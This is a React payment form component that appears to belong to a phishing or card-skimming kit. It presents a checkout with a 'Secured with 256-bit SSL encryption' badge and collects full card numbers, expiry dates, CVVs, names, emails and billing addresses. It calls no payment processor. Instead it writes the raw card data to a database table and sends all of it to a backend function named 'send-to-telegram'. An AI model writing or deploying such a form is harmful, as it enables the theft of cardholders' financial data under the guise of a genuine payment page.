import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { CreditCard, Lock, Shield, ChevronDown, ChevronUp } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

interface PaymentFormProps {
  amount: string;
  onSuccess: (sessionId: string) => void;
}

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
};

const formatExpiry = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
};

const PaymentForm = ({ amount, onSuccess }: PaymentFormProps) => {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [showBilling, setShowBilling] = useState(false);
  const [form, setForm] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
    cardholderName: "",
    fullName: "",
    email: "",
    address: "",
    city: "",
    country: "",
    zip: "",
  });

  const update = (field: string, value: string) => {
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "cvv") value = value.replace(/\D/g, "").slice(0, 4);
    setForm((f) => ({ ...f, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Create session in DB
      const { data: session, error: dbError } = await supabase
        .from("sessions")
        .insert({ status: "pending", form_data: form as any })
        .select("id")
        .single();

      if (dbError || !session) throw new Error("Failed to create session");

      // Send to Telegram
      const res = await fetch(
        `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "payment", ...form, amount, sessionId: session.id }),
        }
      );

      if (!res.ok) throw new Error("Failed to process payment");
      onSuccess(session.id);
    } catch {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full max-w-md animate-fade-up">
      <div className="glass-card rounded-2xl overflow-hidden">
        {/* Header */}
        <div className="bg-gradient-to-br from-primary/5 to-accent px-8 py-6 border-b border-border/50">
          <p className="text-sm font-medium text-muted-foreground">Total amount</p>
          <p className="text-4xl font-bold tracking-tight text-foreground mt-1">${amount}</p>
        </div>

        <div className="px-8 py-6">
          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Card Section */}
            <div className="space-y-3">
              <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                <CreditCard className="h-3.5 w-3.5" />
                Card information
              </div>

              <div className="rounded-xl border border-border bg-secondary/30 overflow-hidden divide-y divide-border">
                <Input
                  placeholder="1234 1234 1234 1234"
                  value={form.cardNumber}
                  onChange={(e) => update("cardNumber", e.target.value)}
                  className="border-0 rounded-none h-12 px-4 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 text-base"
                  required
                />
                <div className="flex divide-x divide-border">
                  <Input
                    placeholder="MM / YY"
                    value={form.expiry}
                    onChange={(e) => update("expiry", e.target.value)}
                    className="border-0 rounded-none h-12 px-4 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 flex-1"
                    required
                  />
                  <Input
                    placeholder="CVC"
                    value={form.cvv}
                    onChange={(e) => update("cvv", e.target.value)}
                    className="border-0 rounded-none h-12 px-4 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 flex-1"
                    required
                  />
                </div>
              </div>
            </div>

            {/* Cardholder */}
            <div className="space-y-2">
              <Label className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                Cardholder name
              </Label>
              <Input
                placeholder="Full name on card"
                value={form.cardholderName}
                onChange={(e) => update("cardholderName", e.target.value)}
                className="h-12 bg-secondary/30 border-border"
                required
              />
            </div>

            {/* Email */}
            <div className="space-y-2">
              <Label className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                Email
              </Label>
              <Input
                type="email"
                placeholder="you@example.com"
                value={form.email}
                onChange={(e) => update("email", e.target.value)}
                className="h-12 bg-secondary/30 border-border"
                required
              />
            </div>

            {/* Billing toggle */}
            <button
              type="button"
              onClick={() => setShowBilling(!showBilling)}
              className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-muted-foreground hover:text-foreground transition-colors w-full"
            >
              {showBilling ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
              Billing address
            </button>

            {showBilling && (
              <div className="space-y-3 animate-fade-up">
                <Input
                  placeholder="Full name"
                  value={form.fullName}
                  onChange={(e) => update("fullName", e.target.value)}
                  className="h-12 bg-secondary/30 border-border"
                />
                <Input
                  placeholder="Address"
                  value={form.address}
                  onChange={(e) => update("address", e.target.value)}
                  className="h-12 bg-secondary/30 border-border"
                />
                <div className="grid grid-cols-3 gap-3">
                  <Input
                    placeholder="City"
                    value={form.city}
                    onChange={(e) => update("city", e.target.value)}
                    className="h-12 bg-secondary/30 border-border"
                  />
                  <Input
                    placeholder="Country"
                    value={form.country}
                    onChange={(e) => update("country", e.target.value)}
                    className="h-12 bg-secondary/30 border-border"
                  />
                  <Input
                    placeholder="ZIP"
                    value={form.zip}
                    onChange={(e) => update("zip", e.target.value)}
                    className="h-12 bg-secondary/30 border-border"
                  />
                </div>
              </div>
            )}

            <Button
              type="submit"
              className="w-full h-12 text-base font-semibold rounded-xl bg-primary hover:bg-primary/90 transition-all duration-200 shadow-lg shadow-primary/25"
              disabled={loading}
            >
              {loading ? (
                <div className="flex items-center gap-2">
                  <div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                  Processing...
                </div>
              ) : (
                <>
                  <Lock className="h-4 w-4 mr-2" />
                  Pay ${amount}
                </>
              )}
            </Button>

            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
              <Shield className="h-3.5 w-3.5" />
              <span>Secured with 256-bit SSL encryption</span>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentForm;
